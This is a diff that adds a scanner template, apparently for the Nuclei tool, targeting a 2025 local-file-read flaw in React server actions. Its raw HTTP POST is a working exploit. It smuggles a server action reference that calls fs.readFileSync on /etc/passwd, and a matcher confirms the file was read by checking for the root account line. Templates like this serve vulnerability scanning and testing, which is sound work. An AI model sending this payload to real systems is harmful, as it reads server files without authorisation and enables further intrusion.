@@ -1,0 +1,31 @@
+id: react-lfi
+
+info:
+  name: react-lfi
+  author: react
+  severity: high
+  tags: lfi,nodejs,fs,readfile,cve2025
+
+requests:
+  - raw:
+      - |
+        POST / HTTP/2
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----CVE2025Boundary
+        Content-Encoding: gzip
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
+        Accept: text/x-component
+
+        ----CVE2025Boundary
+        Content-Disposition: form-data; name="$ACTION_REF_0"
+
+
+        ----CVE2025Boundary
+        Content-Disposition: form-data; name="$ACTION_0:0"
+
+        {"id":"fs.readFileSync","bound":["/etc/passwd"]}
+        ----CVE2025Boundary--
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body, 'root:x:0:0:') && contains(body, '/etc/passwd')"
